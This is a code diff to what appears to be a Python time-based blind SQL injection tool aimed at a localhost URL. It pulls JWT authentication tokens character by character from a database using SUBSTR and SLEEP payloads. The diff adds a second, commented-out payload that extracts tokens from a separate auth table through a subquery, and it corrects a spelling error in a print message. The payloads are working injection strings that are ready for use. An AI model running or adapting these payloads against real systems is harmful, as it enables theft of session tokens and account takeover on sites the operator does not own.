@@ -12,6 +12,9 @@ TARGET = "http://localhost/?id=2$payload$"
 #   '$char$' where the index being tested and current test character will be inserted.
 PAYLOAD = "' AND SUBSTR(CAST(jwt as BINARY), $index$ %2B 1, 1) = '$char$' AND SLEEP(0.2) OR '"
 
+# Payload for extracting JWTs from seperate auth tables (obviously must be in the same database)
+#PAYLOAD = " AND '$char$' = (SELECT SUBSTR(CAST(jwt as BINARY), $index$ %2B 1, 1) FROM authTable) AND SLEEP(0.2)"
+
 # If a query takes longer than this then the SQL server slept
 SQL_SLEPT_THRESHOLD = 0.2
 
@@ -49,7 +52,7 @@ def query_char(index, charset):
 
 
 def main():
-    print("[+] Retriving JWT Tokens.....")
+    print("[+] Retrieving JWT Tokens.....")
     print("[+] ", end="")
 
     # a list of characters to test. The blank string means EOL
